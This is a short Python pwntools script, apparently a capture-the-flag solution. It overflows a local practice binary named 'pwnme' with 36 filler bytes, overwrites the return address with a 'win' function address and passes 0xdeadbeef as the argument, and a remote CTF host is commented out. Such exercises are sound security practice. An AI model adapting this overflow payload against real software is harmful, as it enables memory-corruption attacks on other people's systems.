from pwn import process, remote, gdb

p = process("./pwnme")
gdb.attach(p)

#p = remote("0.cloud.chals.io", 28949)

offset = "A"*36
win_func = "\xd6\x91\x04\x08"
idk = "C"*4
arg = "\xef\xbe\xad\xde"
payload = offset + win_func + idk + arg

p.sendline(payload)

p.interactive()
